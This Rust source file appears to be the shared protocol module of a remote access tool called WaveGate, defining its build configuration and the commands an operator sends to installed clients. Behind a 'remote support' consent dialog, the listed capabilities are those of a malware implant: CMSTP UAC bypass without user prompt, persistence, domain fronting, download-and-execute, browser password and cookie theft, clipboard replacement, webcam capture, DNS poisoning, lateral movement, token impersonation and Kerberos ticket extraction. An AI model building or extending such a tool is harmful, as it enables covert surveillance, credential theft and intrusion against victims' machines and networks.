//! Shared protocol definitions for client-server communication.
//!
//! Message format:
//! - 4 bytes: message length (u32, big-endian)
//! - 1 byte: message type
//! - N bytes: JSON payload
//!
//! All messages are encrypted via TLS at the transport layer.

use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::fmt;

// ============================================================================
// Client Configuration (embedded at build time)
// ============================================================================

/// Persistence method for auto-start behavior
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub enum PersistenceMethod {
    #[default]
    RegistryAutorun,
    ScheduledTask,
    StartupFolder,
    ServiceInstallation,
}

/// Elevation method for obtaining admin privileges
#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub enum ElevationMethod {
    /// Standard UAC prompt via ShellExecute runas
    #[default]
    Request,
    /// Auto-elevation via CMSTP bypass (no user interaction required)
    Auto,
}

/// DNS resolution mode
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub enum DnsMode {
    #[default]
    System,
    Custom {
        primary: String,
        backup: Option<String>,
    },
}

/// Icon type for disclosure dialog
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub enum DisclosureIcon {
    #[default]
    Information,
    Warning,
    Shield,
    Custom,
}

/// Disclosure/consent dialog configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisclosureConfig {
    pub enabled: bool,
    pub title: String,
    pub message: String,
    pub icon: DisclosureIcon,
}

impl Default for DisclosureConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            title: "Remote Support Client".to_string(),
            message: "This software enables remote technical support. By clicking Accept, you consent to remote access.".to_string(),
            icon: DisclosureIcon::Information,
        }
    }
}

/// Auto-uninstall trigger conditions
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub enum UninstallTrigger {
    #[default]
    None,
    /// Uninstall at specific date/time (ISO 8601 format)
    DateTime { datetime: String },
    /// Uninstall after no server contact for N minutes
    NoContact { minutes: u32 },
    /// Uninstall if running under specific username
    SpecificUser { username: String },
    /// Uninstall if running on specific hostname
    SpecificHostname { hostname: String },
}

/// Proxy type for outbound connections
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum ProxyType {
    /// HTTP CONNECT proxy
    #[default]
    Http,
    /// SOCKS5 proxy
    Socks5,
}

/// Proxy configuration for client connections
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyConfig {
    /// Proxy type (HTTP CONNECT or SOCKS5)
    pub proxy_type: ProxyType,
    /// Proxy server hostname or IP
    pub host: String,
    /// Proxy server port
    pub port: u16,
    /// Optional username for proxy authentication
    pub username: Option<String>,
    /// Optional password for proxy authentication
    pub password: Option<String>,
}

/// Complete client configuration embedded at build time
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientConfig {
    // Connection settings
    pub primary_host: String,
    pub backup_host: Option<String>,
    pub port: u16,
    /// Custom SNI hostname for TLS handshake (domain fronting)
    /// If None, uses the actual connection hostname
    #[serde(default)]
    pub sni_hostname: Option<String>,

    /// Proxy configuration for outbound connections
    #[serde(default)]
    pub proxy: Option<ProxyConfig>,

    /// Use WebSocket mode (wraps protocol in WS frames for firewall evasion)
    #[serde(default)]
    pub websocket_mode: bool,

    /// Custom WebSocket path (default: /ws)
    #[serde(default)]
    pub websocket_path: Option<String>,

    // Build identification
    pub build_id: String,

    // Mutex/single instance
    pub mutex_name: String,

    // Startup & behavior
    pub request_elevation: bool,
    /// Method to use for elevation (Request = standard UAC, Auto = CMSTP bypass)
    #[serde(default)]
    pub elevation_method: ElevationMethod,
    pub run_on_startup: bool,
    pub persistence_method: PersistenceMethod,
    pub prevent_sleep: bool,
    pub run_delay_secs: u32,
    pub connect_delay_secs: u32,
    pub restart_delay_secs: u32,

    // DNS settings
    pub dns_mode: DnsMode,

    // Consent dialog
    pub disclosure: DisclosureConfig,

    // Auto-uninstall
    pub uninstall_trigger: UninstallTrigger,
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            primary_host: "127.0.0.1".to_string(),
            backup_host: None,
            port: 4444,
            sni_hostname: None,
            proxy: None,
            websocket_mode: false,
            websocket_path: None,
            build_id: "dev-0.1.0".to_string(),
            mutex_name: "WaveGateClient".to_string(),
            request_elevation: false,
            elevation_method: ElevationMethod::default(),
            run_on_startup: true,
            persistence_method: PersistenceMethod::default(),
            prevent_sleep: false,
            run_delay_secs: 0,
            connect_delay_secs: 0,
            restart_delay_secs: 5,
            dns_mode: DnsMode::default(),
            disclosure: DisclosureConfig::default(),
            uninstall_trigger: UninstallTrigger::default(),
        }
    }
}

/// Maximum message size (10 MB)
pub const MAX_MESSAGE_SIZE: u32 = 10 * 1024 * 1024;

/// Protocol version for compatibility checking
pub const PROTOCOL_VERSION: u32 = 1;

/// Protocol errors
#[derive(Debug)]
pub enum ProtocolError {
    Io(std::io::Error),
    MessageTooLarge(u32),
    InvalidMessageType(u8),
    Json(serde_json::Error),
    VersionMismatch(u32),
    AuthFailed(String),
    ConnectionClosed,
}

impl fmt::Display for ProtocolError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io(e) => write!(f, "IO error: {}", e),
            Self::MessageTooLarge(size) => write!(f, "Message too large: {} bytes (max {})", size, MAX_MESSAGE_SIZE),
            Self::InvalidMessageType(t) => write!(f, "Invalid message type: {}", t),
            Self::Json(e) => write!(f, "JSON error: {}", e),
            Self::VersionMismatch(v) => write!(f, "Protocol version mismatch: client={}, server={}", v, PROTOCOL_VERSION),
            Self::AuthFailed(msg) => write!(f, "Authentication failed: {}", msg),
            Self::ConnectionClosed => write!(f, "Connection closed"),
        }
    }
}

impl std::error::Error for ProtocolError {}

impl From<std::io::Error> for ProtocolError {
    fn from(e: std::io::Error) -> Self {
        Self::Io(e)
    }
}

impl From<serde_json::Error> for ProtocolError {
    fn from(e: serde_json::Error) -> Self {
        Self::Json(e)
    }
}

/// Message types sent from server to client
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum ServerMessageType {
    /// Server acknowledgment of client registration
    Welcome = 0x01,
    /// Heartbeat ping
    Ping = 0x02,
    /// Command request
    Command = 0x10,
    /// Request system information update
    RequestInfo = 0x11,
    /// Disconnect request
    Disconnect = 0x20,
    /// Proxy: request client to connect to a target
    ProxyConnect = 0x50,
    /// Proxy: data from operator to target
    ProxyData = 0x51,
    /// Proxy: close a proxy connection
    ProxyClose = 0x52,
}

/// Message types sent from client to server
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum ClientMessageType {
    /// Initial client registration with system info
    Register = 0x01,
    /// Heartbeat pong response
    Pong = 0x02,
    /// Command response
    CommandResponse = 0x10,
    /// System information update
    InfoUpdate = 0x11,
    /// Client-initiated disconnect
    Goodbye = 0x20,
    /// Shell output stream (stdout/stderr data)
    ShellOutput = 0x30,
    /// Shell session ended
    ShellExit = 0x31,
    /// Media frame (video + optional audio)
    MediaFrame = 0x40,
    /// Remote desktop frame (JPEG tiles - legacy)
    RemoteDesktopFrame = 0x41,
    /// Remote desktop H.264 frame
    RemoteDesktopH264Frame = 0x42,
    /// Proxy: connection established or failed
    ProxyConnectResult = 0x50,
    /// Proxy: data from target to operator
    ProxyData = 0x51,
    /// Proxy: connection closed by target
    ProxyClosed = 0x52,
}

impl TryFrom<u8> for ServerMessageType {
    type Error = ProtocolError;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0x01 => Ok(Self::Welcome),
            0x02 => Ok(Self::Ping),
            0x10 => Ok(Self::Command),
            0x11 => Ok(Self::RequestInfo),
            0x20 => Ok(Self::Disconnect),
            0x50 => Ok(Self::ProxyConnect),
            0x51 => Ok(Self::ProxyData),
            0x52 => Ok(Self::ProxyClose),
            _ => Err(ProtocolError::InvalidMessageType(value)),
        }
    }
}

impl TryFrom<u8> for ClientMessageType {
    type Error = ProtocolError;

    fn try_from(value: u8) -> Result<Self, Self::Error> {
        match value {
            0x01 => Ok(Self::Register),
            0x02 => Ok(Self::Pong),
            0x10 => Ok(Self::CommandResponse),
            0x11 => Ok(Self::InfoUpdate),
            0x20 => Ok(Self::Goodbye),
            0x30 => Ok(Self::ShellOutput),
            0x31 => Ok(Self::ShellExit),
            0x40 => Ok(Self::MediaFrame),
            0x41 => Ok(Self::RemoteDesktopFrame),
            0x42 => Ok(Self::RemoteDesktopH264Frame),
            0x50 => Ok(Self::ProxyConnectResult),
            0x51 => Ok(Self::ProxyData),
            0x52 => Ok(Self::ProxyClosed),
            _ => Err(ProtocolError::InvalidMessageType(value)),
        }
    }
}

// ============================================================================
// Server -> Client Messages
// ============================================================================

/// Welcome message sent after successful registration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WelcomeMessage {
    pub protocol_version: u32,
    pub server_time: u64,
    pub heartbeat_interval_ms: u32,
}

/// Ping message for keepalive
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PingMessage {
    pub timestamp: u64,
    pub seq: u32,
}

/// Command sent from server to client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandMessage {
    /// Unique command ID for tracking responses
    pub id: String,
    /// Command type
    pub command: CommandType,
}

/// Available commands that can be sent to clients
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "params")]
pub enum CommandType {
    /// Execute a shell command (one-shot, waits for completion)
    Shell { command: String, timeout_ms: Option<u32> },
    /// Execute PowerShell script (one-shot, waits for completion)
    PowerShell { script: String, timeout_ms: Option<u32> },
    /// Start interactive shell session (streaming)
    ShellStart,
    /// Send input to interactive shell
    ShellInput { data: String },
    /// Close interactive shell session
    ShellClose,
    /// Download a file from client
    FileDownload { path: String },
    /// Upload a file to client
    FileUpload { path: String, data: Vec<u8> },
    /// List directory contents
    ListDirectory { path: String },
    /// Get available drives (Windows) or root mounts (Unix)
    ListDrives,
    /// Delete a file or directory
    FileDelete { path: String, recursive: bool },
    /// Rename/move a file or directory
    FileRename { old_path: String, new_path: String },
    /// Create a new directory
    CreateDirectory { path: String },
    /// Copy a file or directory
    FileCopy { source: String, destination: String },
    /// Execute/run a file
    FileExecute { path: String, args: Option<String>, hidden: bool, delete_after: bool, independent: bool },
    /// Download a file from URL and execute it
    DownloadExecute { url: String, path: String, args: Option<String>, hidden: bool, delete_after: bool, independent: bool },
    /// Get clipboard contents (current + history)
    GetClipboard,
    /// Set clipboard contents
    SetClipboard { data: String },
    /// Add a clipboard replacement rule
    AddClipboardRule { id: String, pattern: String, replacement: String, enabled: bool },
    /// Remove a clipboard replacement rule
    RemoveClipboardRule { id: String },
    /// Update a clipboard rule (enable/disable)
    UpdateClipboardRule { id: String, enabled: bool },
    /// Get all clipboard rules
    ListClipboardRules,
    /// Clear clipboard history
    ClearClipboardHistory,
    /// Take screenshot
    Screenshot,
    /// Open URL in browser
    OpenUrl { url: String, hidden: bool },
    /// Get running processes
    ListProcesses,
    /// Kill a process
    KillProcess { pid: u32 },
    /// Request full system info update
    GetSystemInfo,
    /// Uninstall/self-destruct
    Uninstall,
    /// Disconnect client from server
    Disconnect,
    /// Reconnect client to server
    Reconnect,
    /// Restart client process
    RestartClient,
    /// Request elevation (run as admin) - shows UAC prompt
    Elevate,
    /// Force elevation (auto-elevate via CMSTP) - no UAC prompt
    ForceElevate,
    /// System actions
    Shutdown { force: bool, delay_secs: u32 },
    Reboot { force: bool, delay_secs: u32 },
    Logoff { force: bool },
    Lock,
    /// Show message box on client
    MessageBox { title: String, message: String, icon: String },
    /// List available media devices (webcams and audio inputs)
    ListMediaDevices,
    /// Start media stream (webcam + optional audio)
    StartMediaStream {
        video_device: Option<String>,
        audio_device: Option<String>,
        fps: u8,
        quality: u8,
        /// Target resolution: "native", "1080p", "720p", "480p", "360p"
        resolution: Option<String>,
    },
    /// Stop media stream
    StopMediaStream,
    /// List startup entries
    ListStartupEntries,
    /// Remove a startup entry
    RemoveStartupEntry {
        entry_type: String,
        registry_key: Option<String>,
        registry_value: Option<String>,
        file_path: Option<String>,
    },
    /// List TCP connections
    ListTcpConnections,
    /// Kill a TCP connection (by killing its owning process)
    KillTcpConnection { pid: u32 },
    /// List Windows services
    ListServices,
    /// Start a Windows service
    StartService { name: String },
    /// Stop a Windows service
    StopService { name: String },
    /// Restart a Windows service
    RestartService { name: String },
    /// Start a chat session with the user
    ChatStart { operator_name: String },
    /// Send a chat message to the user
    ChatMessage { message: String },
    /// Close the chat window
    ChatClose,
    /// Extract browser credentials (passwords and cookies)
    GetCredentials,
    /// Proxy: establish TCP connection to target (legacy SOCKS5 format)
    ProxyConnect { conn_id: u32, host: String, port: u16 },
    /// Proxy: establish connection to target (unified format with TCP/pipe support)
    ProxyConnectTarget { conn_id: u32, target: ProxyTarget },
    /// Proxy: send data to target (base64 encoded)
    ProxyData { conn_id: u32, data: String },
    /// Proxy: close connection
    ProxyClose { conn_id: u32 },
    /// Get hosts file entries
    GetHostsEntries,
    /// Add a hosts file entry
    AddHostsEntry { hostname: String, ip: String },
    /// Remove a hosts file entry
    RemoveHostsEntry { hostname: String },
    // Remote Desktop commands
    /// Start remote desktop session (screen streaming)
    RemoteDesktopStart {
        fps: u8,
        quality: u8,
        /// Target resolution: "native", "1080p", "720p", "480p", "360p"
        resolution: Option<String>,
    },
    /// Stop remote desktop session
    RemoteDesktopStop,
    /// Send mouse input to client
    RemoteDesktopMouseInput {
        /// Mouse X position (0-65535 normalized)
        x: u16,
        /// Mouse Y position (0-65535 normalized)
        y: u16,
        /// Button action: "move", "left_down", "left_up", "right_down", "right_up", "middle_down", "middle_up", "scroll"
        action: String,
        /// Scroll delta (for scroll action)
        scroll_delta: Option<i16>,
    },
    /// Send keyboard input to client
    RemoteDesktopKeyInput {
        /// Virtual key code
        vk_code: u16,
        /// Key action: "down", "up"
        action: String,
    },
    /// Send special key combination (Ctrl+Alt+Del, etc.)
    RemoteDesktopSpecialKey {
        /// Special key: "ctrl_alt_del", "alt_tab", "alt_f4", "win", "ctrl_esc", "print_screen"
        key: String,
    },
    /// Start H.264 remote desktop session (hardware-accelerated streaming)
    RemoteDesktopH264Start {
        fps: u8,
        /// Bitrate in Mbps (1-50)
        bitrate_mbps: u8,
        /// Keyframe interval in seconds (1-10)
        keyframe_interval_secs: u8,
    },
    /// Stop H.264 remote desktop session
    RemoteDesktopH264Stop,
    // Registry Manager commands
    /// List registry keys under a path
    RegistryListKeys { path: String },
    /// List registry values in a key
    RegistryListValues { path: String },
    /// Get a specific registry value
    RegistryGetValue { path: String, name: String },
    /// Set/create a registry value
    RegistrySetValue {
        path: String,
        name: String,
        value_type: String,  // "String", "DWord", "QWord", "Binary", "ExpandString", "MultiString"
        data: String,        // String representation of the value
    },
    /// Delete a registry value
    RegistryDeleteValue { path: String, name: String },
    /// Create a registry key
    RegistryCreateKey { path: String },
    /// Delete a registry key (and optionally subkeys)
    RegistryDeleteKey { path: String, recursive: bool },
    // Task Scheduler commands
    /// List all scheduled tasks
    ListScheduledTasks,
    /// Run a scheduled task immediately
    RunScheduledTask { name: String },
    /// Enable a scheduled task
    EnableScheduledTask { name: String },
    /// Disable a scheduled task
    DisableScheduledTask { name: String },
    /// Delete a scheduled task
    DeleteScheduledTask { name: String },
    /// Create a new scheduled task
    CreateScheduledTask {
        name: String,
        description: Option<String>,
        /// Action: path to executable
        action_path: String,
        /// Arguments for the executable
        action_args: Option<String>,
        /// Trigger type: "once", "daily", "weekly", "logon", "startup"
        trigger_type: String,
        /// Start time for time-based triggers (ISO 8601 format)
        start_time: Option<String>,
        /// Interval for daily/weekly triggers (e.g., every N days)
        interval: Option<u32>,
    },
    // WMI commands
    /// Execute a WMI query
    WmiQuery { query: String, namespace: Option<String> },
    // DNS Cache commands
    /// Get DNS cache entries
    GetDnsCache,
    /// Flush DNS cache
    FlushDnsCache,
    /// Add DNS cache entry (via hosts or cache poisoning)
    AddDnsCacheEntry { hostname: String, ip: String },
    // Lateral Movement commands
    /// Scan local network for hosts
    LateralScanNetwork {
        /// Subnet to scan (e.g., "192.168.1.0/24") or "auto" for local subnet
        subnet: String,
        /// Ports to check (default: 445, 135, 5985)
        ports: Option<Vec<u16>>,
    },
    /// Enumerate SMB shares on a remote host
    LateralEnumShares { host: String },
    /// Test credentials against a remote host
    LateralTestCredentials {
        host: String,
        username: String,
        password: String,
        /// Protocol: "smb", "winrm", "wmi"
        protocol: String,
    },
    /// Execute command on remote host via WMI
    LateralExecWmi {
        host: String,
        username: String,
        password: String,
        command: String,
    },
    /// Execute command on remote host via WinRM/PSRemoting
    LateralExecWinRm {
        host: String,
        username: String,
        password: String,
        command: String,
    },
    /// Execute command on remote host via SMB + service creation
    LateralExecSmb {
        host: String,
        username: String,
        password: String,
        command: String,
    },
    /// Deploy WaveGate client to remote host
    LateralDeploy {
        host: String,
        username: String,
        password: String,
        /// Method: "wmi", "winrm", "smb"
        method: String,
    },

    // =========================================================================
    // Token Management (for impersonation during lateral movement)
    // =========================================================================

    /// Create a new access token from credentials
    TokenMake {
        domain: String,
        username: String,
        password: String,
    },
    /// List all created tokens
    TokenList,
    /// Impersonate a token by ID
    TokenImpersonate { token_id: u32 },
    /// Revert to original process token
    TokenRevert,
    /// Delete a token by ID
    TokenDelete { token_id: u32 },

    // =========================================================================
    // Jump Commands (remote execution with payload deployment)
    // =========================================================================

    /// SCShell: Hijack existing service to run payload, then restore
    JumpScshell {
        /// Target hostname or IP
        host: String,
        /// Service to hijack (e.g., "UevAgentService")
        service_name: String,
        /// Local path to executable to deploy
        executable_path: String,
    },
    /// PsExec-style: Copy executable, create/start service, cleanup
    JumpPsexec {
        /// Target hostname or IP
        host: String,
        /// Service name to create
        service_name: String,
        /// Local path to executable to deploy
        executable_path: String,
    },
    /// WinRM: Deploy and execute via PowerShell remoting
    JumpWinrm {
        /// Target hostname or IP
        host: String,
        /// Local path to executable to deploy
        executable_path: String,
    },

    // =========================================================================
    // Pivot Commands (linking agents through SMB pipes)
    // =========================================================================

    /// Connect to SMB named pipe pivot on remote host
    PivotSmbConnect {
        /// Target hostname (e.g., "TALON-DC")
        host: String,
        /// Pipe name (e.g., "agent_pipe")
        pipe_name: String,
    },
    /// Disconnect SMB pivot
    PivotSmbDisconnect { pivot_id: u32 },
    /// List active pivot connections
    PivotList,

    // =========================================================================
    // Active Directory Enumeration
    // =========================================================================

    /// Get domain information (name, DCs, forest, functional level)
    AdGetDomainInfo,
    /// Enumerate domain users
    AdEnumUsers {
        /// Filter: "all", "admins", "service_accounts", "enabled", "disabled"
        #[serde(default)]
        filter: Option<String>,
        /// Search filter (partial username match)
        #[serde(default)]
        search: Option<String>,
    },
    /// Enumerate domain groups
    AdEnumGroups {
        /// Search filter (partial group name match)
        #[serde(default)]
        search: Option<String>,
    },
    /// Get members of a specific group
    AdGetGroupMembers {
        /// Group name (e.g., "Domain Admins")
        group_name: String,
    },
    /// Enumerate domain computers
    AdEnumComputers {
        /// Filter: "all", "servers", "workstations", "dcs"
        #[serde(default)]
        filter: Option<String>,
        /// Search filter (partial hostname match)
        #[serde(default)]
        search: Option<String>,
    },
    /// Enumerate Service Principal Names (SPNs) - Kerberoasting targets
    AdEnumSpns {
        /// Search filter (partial SPN match)
        #[serde(default)]
        search: Option<String>,
    },
    /// Enumerate logged-on sessions (who is where)
    AdEnumSessions {
        /// Target computer (empty = localhost)
        #[serde(default)]
        target: Option<String>,
    },
    /// Enumerate domain trusts
    AdEnumTrusts,

    // =========================================================================
    // Local Security Enumeration
    // =========================================================================

    /// Enumerate local groups and their members (Administrators, RDP Users, etc.)
    EnumLocalGroups,
    /// Check remote access rights (DCOM, RDP, WinRM permissions)
    EnumRemoteAccessRights,
    /// Enumerate ACLs on AD objects (who can control what)
    AdEnumAcls {
        /// Object type to enumerate: "users", "groups", "computers", "ous", "gpos"
        #[serde(default)]
        object_type: Option<String>,
        /// Specific object DN to check (if empty, enumerates interesting objects)
        #[serde(default)]
        target_dn: Option<String>,
    },

    // =========================================================================
    // Kerberos Ticket Management
    // =========================================================================

    /// Extract Kerberos tickets from current session (klist)
    KerberosExtractTickets,
    /// Purge all Kerberos tickets from current session (klist purge)
    KerberosPurgeTickets,
}

/// Request for client to send updated system info
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestInfoMessage {
    /// Which fields to update (empty = all)
    pub fields: Vec<String>,
}

/// Disconnect message
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisconnectMessage {
    pub reason: String,
}

// ============================================================================
// Client -> Server Messages
// ============================================================================

/// Initial registration message from client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterMessage {
    /// Protocol version client supports
    pub protocol_version: u32,
    /// Unique client identifier (generated on first run, persisted)
    pub uid: String,
    /// Build identifier
    pub build_id: String,
    /// System information
    pub system_info: SystemInfo,
}

/// System information sent by client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    /// Machine/computer name
    pub machine_name: String,
    /// Current username
    pub username: String,
    /// Account type: "User", "Admin", "System"
    pub account_type: String,
    /// Operating system name and version
    pub os: String,
    /// Architecture: "x64", "x86", "arm64"
    pub arch: String,
    /// System uptime in seconds
    pub uptime_secs: u64,
    /// Currently active window title
    pub active_window: Option<String>,
    /// CPU usage percentage (0-100)
    pub cpu_percent: u8,
    /// RAM usage percentage (0-100)
    pub ram_percent: u8,
    /// Local IP addresses
    pub local_ips: Vec<String>,
    /// Country (from geolocation)
    pub country: Option<String>,
    /// CPU model name
    pub cpu_name: Option<String>,
    /// Number of CPU cores
    pub cpu_cores: Option<u32>,
    /// GPU name
    pub gpu_name: Option<String>,
    /// GPU VRAM in bytes
    pub gpu_vram: Option<u64>,
    /// Total RAM in bytes
    pub ram_total: Option<u64>,
    /// Motherboard manufacturer and model
    pub motherboard: Option<String>,
    /// Storage drives
    pub drives: Vec<DriveInfo>,
}

/// Information about a storage drive
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DriveInfo {
    /// Drive letter or mount point
    pub name: String,
    /// Total size in bytes
    pub total_bytes: u64,
    /// Free space in bytes
    pub free_bytes: u64,
    /// File system type (NTFS, FAT32, etc.)
    pub fs_type: String,
}

/// Pong response to ping
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PongMessage {
    pub timestamp: u64,
    pub seq: u32,
}

/// Response to a command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResponseMessage {
    /// Command ID this is responding to
    pub id: String,
    /// Whether command succeeded
    pub success: bool,
    /// Response data (varies by command type)
    pub data: CommandResponseData,
}

/// Response data for different command types
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "result")]
pub enum CommandResponseData {
    /// Shell/PowerShell output (one-shot command)
    ShellOutput { stdout: String, stderr: String, exit_code: i32 },
    /// Interactive shell started successfully
    ShellStarted,
    /// Interactive shell failed to start
    ShellStartFailed { error: String },
    /// Interactive shell closed
    ShellClosed,
    /// File data
    FileData { data: Vec<u8> },
    /// File operation result
    FileResult { success: bool, error: Option<String> },
    /// Directory listing
    DirectoryListing { entries: Vec<DirectoryEntry> },
    /// Drives listing
    DrivesList { drives: Vec<DriveInfo> },
    /// Clipboard contents with history
    Clipboard { current: String, history: Vec<ClipboardEntry> },
    /// Clipboard rules list
    ClipboardRules { rules: Vec<ClipboardRule> },
    /// Clipboard rule operation result
    ClipboardRuleResult { success: bool },
    /// Screenshot image data (PNG)
    Screenshot { data: Vec<u8> },
    /// URL open result
    UrlResult { success: bool },
    /// Process list
    ProcessList { processes: Vec<ProcessInfo> },
    /// Generic result
    Generic { message: String },
    /// Error
    Error { message: String },
    /// Media device list
    MediaDevices { video_devices: Vec<MediaDeviceInfo>, audio_devices: Vec<MediaDeviceInfo> },
    /// Media stream started
    MediaStreamStarted,
    /// Media stream stopped
    MediaStreamStopped,
    /// Startup entries list
    StartupList { entries: Vec<StartupEntry> },
    /// Startup entry operation result
    StartupResult { success: bool, message: String },
    /// TCP connections list
    TcpConnectionList { connections: Vec<TcpConnectionInfo> },
    /// Services list
    ServiceList { services: Vec<ServiceInfo> },
    /// Service operation result
    ServiceResult { success: bool, message: String },
    /// Chat session started
    ChatStarted,
    /// Chat message from user
    ChatUserMessage { message: String },
    /// Chat window closed by user
    ChatClosed,
    /// Extracted credentials
    Credentials { passwords: Vec<CredentialEntry>, cookies: Vec<CookieEntry> },
    /// Hosts file entries
    HostsEntries { entries: Vec<HostsEntry> },
    /// Hosts entry operation result
    HostsResult { success: bool, message: String },
    /// Remote desktop stream started (JPEG tiles)
    RemoteDesktopStarted { width: u16, height: u16 },
    /// Remote desktop stream stopped
    RemoteDesktopStopped,
    /// Remote desktop input result
    RemoteDesktopInputResult { success: bool },
    /// H.264 remote desktop stream started
    RemoteDesktopH264Started { width: u16, height: u16, is_hardware: bool },
    /// H.264 remote desktop stream stopped
    RemoteDesktopH264Stopped,
    /// Registry keys list
    RegistryKeys { keys: Vec<RegistryKeyInfo> },
    /// Registry values list
    RegistryValues { values: Vec<RegistryValueInfo> },
    /// Registry operation result
    RegistryResult { success: bool, message: String },
    /// Scheduled tasks list
    ScheduledTaskList { tasks: Vec<ScheduledTaskInfo> },
    /// Scheduled task operation result
    ScheduledTaskResult { success: bool, message: String },
    /// WMI query results
    WmiQueryResult { columns: Vec<String>, rows: Vec<Vec<String>> },
    /// DNS cache entries
    DnsCacheEntries { entries: Vec<DnsCacheEntry> },
    /// DNS cache operation result
    DnsCacheResult { success: bool, message: String },
    /// Network scan progress update
    LateralScanProgress { scanned: u32, total: u32 },
    /// Network scan results
    LateralScanResult { hosts: Vec<NetworkHost> },
    /// SMB share enumeration results
    LateralSharesResult { shares: Vec<SmbShare> },
    /// Credential test result
    LateralCredentialResult { success: bool, message: String },
    /// Remote execution result
    LateralExecResult { success: bool, output: String },
    /// Deployment result
    LateralDeployResult { success: bool, message: String },

    // Token Management Results
    /// Token created successfully
    TokenCreated { token_id: u32, domain: String, username: String },
    /// Token list
    TokenListResult { tokens: Vec<TokenInfo> },
    /// Token impersonation result
    TokenImpersonateResult { success: bool, message: String },
    /// Token revert result
    TokenRevertResult { success: bool, message: String },
    /// Token delete result
    TokenDeleteResult { success: bool, message: String },

    // Jump Execution Results
    /// Jump command result (SCShell, PsExec, WinRM)
    JumpResult {
        success: bool,
        method: String,
        host: String,
        message: String,
        /// Detailed step-by-step output
        steps: Vec<String>,
    },

    // Pivot Results
    /// SMB pivot connected
    PivotConnected { pivot_id: u32, host: String, pipe_name: String },
    /// Pivot disconnected
    PivotDisconnected { pivot_id: u32 },
    /// Pivot list
    PivotListResult { pivots: Vec<PivotInfo> },
    /// Pivot data received
    PivotData { pivot_id: u32, data: Vec<u8> },

    // =========================================================================
    // Active Directory Enumeration Results
    // =========================================================================

    /// Domain information
    AdDomainInfo {
        domain_name: String,
        forest_name: String,
        domain_controller: String,
        domain_controller_ip: String,
        functional_level: String,
        is_domain_joined: bool,
    },
    /// Domain users list
    AdUserList { users: Vec<AdUser> },
    /// Domain groups list
    AdGroupList { groups: Vec<AdGroup> },
    /// Group members list
    AdGroupMembers { group_name: String, members: Vec<AdGroupMember> },
    /// Domain computers list
    AdComputerList { computers: Vec<AdComputer> },
    /// SPN list (Kerberoasting targets)
    AdSpnList { spns: Vec<AdSpnEntry> },
    /// Logged-on sessions list
    AdSessionList { sessions: Vec<AdSession> },
    /// Domain trusts list
    AdTrustList { trusts: Vec<AdTrust> },

    // =========================================================================
    // Local Security Results
    // =========================================================================

    /// Local groups and their members
    LocalGroupList { groups: Vec<LocalGroupInfo> },
    /// Remote access rights (DCOM, RDP, WinRM)
    RemoteAccessRights { rights: RemoteAccessInfo },
    /// AD object ACLs
    AdAclList { acls: Vec<AdObjectAcl> },

    // =========================================================================
    // Kerberos Results
    // =========================================================================

    /// Extracted Kerberos tickets (klist)
    KerberosTicketList { tickets: Vec<KerberosTicket> },
    /// Kerberos operation result
    KerberosResult { success: bool, message: String },

    // Generic Results
    /// Generic success message
    Success { message: String },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectoryEntry {
    pub name: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: Option<u64>,
    pub readonly: bool,
    pub hidden: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_percent: f32,
    pub memory_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StartupEntry {
    pub name: String,
    pub command: String,
    pub location: String,
    pub entry_type: String,
    pub enabled: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub registry_key: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub registry_value: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TcpConnectionInfo {
    pub local_address: String,
    pub remote_address: String,
    pub pid: u32,
    pub process_name: String,
    pub state: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServiceInfo {
    pub name: String,
    pub display_name: String,
    pub status: String,
    pub startup_type: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClipboardEntry {
    pub content: String,
    pub timestamp: u64,
    /// If this entry was replaced by a rule, contains the replacement value
    #[serde(skip_serializing_if = "Option::is_none")]
    pub replaced_with: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClipboardRule {
    pub id: String,
    pub pattern: String,
    pub replacement: String,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MediaDeviceInfo {
    pub id: String,
    pub name: String,
}

/// Screen tile for incremental remote desktop updates
